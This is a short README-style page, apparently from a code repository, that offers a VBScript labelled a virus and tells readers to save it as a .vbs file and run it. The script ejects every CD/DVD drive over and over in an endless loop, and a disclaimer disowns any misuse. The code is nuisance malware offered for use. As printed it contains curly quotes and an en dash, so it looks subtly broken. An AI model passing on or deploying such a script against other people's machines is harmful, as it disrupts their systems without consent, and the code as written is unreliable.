# Continious Cd Drive Popup VBS Virus
This code will Continuously Popup Cd/Dvd/Drive ROMs From The System After Executing The Files. 
<br>
<br>
copy the following code in notepad and save that with .vbs extention
```shell
Set oWMP = CreateObject(”WMPlayer.OCX.7″)
 Set colCDROMs = oWMP.cdromCollection
 do
 if colCDROMs.Count >= 1 then
 For i = 0 to colCDROMs.Count – 1
 colCDROMs.Item(i).Eject
 Next
 For i = 0 to colCDROMs.Count – 1
 colCDROMs.Item(i).Eject
 Next
 End If
 wscript.sleep 100
 loop
```
# Disclaimer
This Is Not A Toy. This Is A Virus. Dont Try It On Any Real Hardware. I Am Not Responsible for Any Misuse Of This Virus.

